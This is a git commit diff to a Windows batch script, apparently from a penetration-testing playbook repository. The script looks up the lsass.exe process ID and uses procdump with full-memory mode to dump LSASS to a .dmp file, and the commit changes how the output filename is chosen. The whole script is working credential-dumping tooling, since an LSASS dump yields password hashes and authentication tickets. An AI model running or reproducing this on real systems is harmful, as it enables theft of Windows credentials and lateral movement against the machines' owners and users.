9b74b0161c86c811da135b455363459fb5a8ebf9
PentestPlaybook <123711693+PentestPlaybook@users.noreply.github.com>
2026-06-12 20:11:00 -0700

    fix: let procdump name output file when no argument provided; show *.dmp on default run

--- lsass_procdump.bat
+++ lsass_procdump.bat
@@ -1,19 +1,20 @@
 @echo off
 setlocal EnableDelayedExpansion
 
-if "%~1"=="" goto :default
+for /f "tokens=2" %%i in ('C:\Windows\System32\tasklist.exe /fi "imagename eq lsass.exe" /nh') do set PID=%%i
+echo LSASS PID: %PID%
+
+if "%~1"=="" (
+    "%~dp0procdump.exe" -accepteula -ma %PID%
+    echo Done.
+    dir "%~dp0*.dmp"
+    goto :eof
+)
 
 set OUTFILE=%~f1
 if "!OUTFILE:~-1!"=="\" set OUTFILE=!OUTFILE:~0,-1!
 if exist "!OUTFILE!\" set OUTFILE=!OUTFILE!\lsass_procdump.dmp
-goto :run
 
-:default
-set OUTFILE=%~dp0lsass_procdump.dmp
-
-:run
-for /f "tokens=2" %%i in ('C:\Windows\System32\tasklist.exe /fi "imagename eq lsass.exe" /nh') do set PID=%%i
-echo LSASS PID: %PID%
 "%~dp0procdump.exe" -accepteula -ma %PID% "!OUTFILE!"
 echo Done.
 dir "!OUTFILE!"
